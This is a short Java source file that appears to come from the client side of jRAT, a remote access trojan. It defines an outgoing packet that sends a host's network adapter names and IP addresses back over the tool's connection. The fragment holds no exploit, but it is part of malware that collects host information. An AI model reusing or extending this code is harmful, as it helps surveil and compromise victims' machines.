package jrat.client.packets.outgoing;

import jrat.client.Connection;

import java.net.InetAddress;
import java.util.ArrayList;


public class Packet56NetworkAdapter implements OutgoingPacket {

	private String displayName;
	private String name;
	private ArrayList<InetAddress> list;

	public Packet56NetworkAdapter(String displayName, String name, ArrayList<InetAddress> list) {
		this.displayName = displayName;
		this.name = name;
		this.list = list;
	}

	@Override
	public void write(Connection con) throws Exception {
        con.writeLine(displayName);
        con.writeLine(name);
        con.writeInt(list.size());

		for (InetAddress addr : list) {
            con.writeLine(addr.getHostAddress());
		}
	}

	@Override
	public short getPacketId() {
		return 56;
	}

}
